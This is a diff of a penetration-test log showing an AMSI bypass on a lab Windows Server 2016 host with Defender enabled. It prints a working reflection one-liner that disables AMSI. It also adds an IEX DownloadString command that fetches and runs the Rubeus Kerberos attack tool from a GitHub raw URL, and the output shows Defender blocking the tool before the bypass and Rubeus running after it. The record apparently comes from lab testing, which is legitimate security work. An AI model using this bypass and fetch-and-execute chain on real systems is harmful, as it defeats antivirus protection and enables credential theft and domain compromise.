@@ -188,7 +188,7 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 PS C:\temp>
 
 
-Test 2 - AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+Test 2 - AMSI bypass as a local admin user remotely logged on a Window 2016 server with Defender (AV) enabled and up-to-date
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
@@ -196,19 +196,17 @@ PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credenti
 
 => Note: Without disabling the AMSI, the script 'Invoke-Rubeus.ps1' is detected and blocked by Windows Defender...
 
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> . .\Invoke-Rubeus.ps1
-At C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Rubeus.ps1:1 char:1
-+ function Invoke-Rubeus([string]$Command)
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');Invoke-Rubeus
+<SNIP>
 This script contains malicious content and has been blocked by your antivirus software.
     + CategoryInfo          : ParserError: (:) [], ParseException
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 
-=> Now let's disable the AMSI and re-execute 'Invoke-Rubeus'.
+=> Now let's disable the AMSI and re-run 'Invoke-Rubeus'.
 
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  . .\Invoke-Rubeus.ps1
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
    ______        _
   (_____ \      | |
